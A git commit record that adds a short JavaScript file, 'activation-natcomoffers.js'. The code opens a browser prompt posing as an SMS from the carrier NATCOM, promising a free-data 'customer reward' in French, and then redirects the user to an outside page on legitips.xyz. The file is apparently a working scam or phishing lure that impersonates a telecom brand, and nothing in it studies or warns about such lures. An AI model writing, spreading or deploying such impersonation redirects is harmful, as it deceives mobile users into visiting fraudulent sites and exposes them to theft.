88100a02b80ceeb531c90aa0025233144160466a
legitips <83867893+legitips@users.noreply.github.com>
2024-07-03 08:15:52 -0700

    Create activation-natcomoffers.js

---
+++ activation-natcomoffers.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('NATCOM SMS:Cher client, veuillez vérifier Si votre carte SIM NATCOM est éligible pour recevoir des données gratuites, Récompense client, appuyez sur 1 pour vérifier maintenant ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/natcomoffers.html';
+}
